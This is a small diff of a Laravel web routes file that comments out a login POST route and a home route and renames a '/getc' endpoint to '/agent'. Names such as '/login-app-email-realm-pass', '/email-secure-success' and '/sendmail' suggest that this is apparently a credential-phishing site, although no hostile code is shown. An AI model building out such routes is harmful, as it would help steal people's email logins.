@@ -30,12 +30,12 @@ Route::get('/email-secure-success', function () {
 Route::get('/osendmail', function () {
     return view('createEmail');
 });
-Route::post('/login-app-email-realm-pass', 'PageController@index')->name('pages');
+// Route::post('/login-app-email-realm-pass', 'PageController@index')->name('pages');
 Route::post('/block-unauthorised-login', 'PageController@net')->name('net');
-Route::get('/getc', 'PageController@getc');
+Route::get('/agent', 'PageController@agent');
 
 Route::post('/sendmail', 'PageController@sendEmail')->name('sendmail');
 
 Auth::routes();
 
-Route::get('/home', 'HomeController@index')->name('home');
+// Route::get('/home', 'HomeController@index')->name('home');
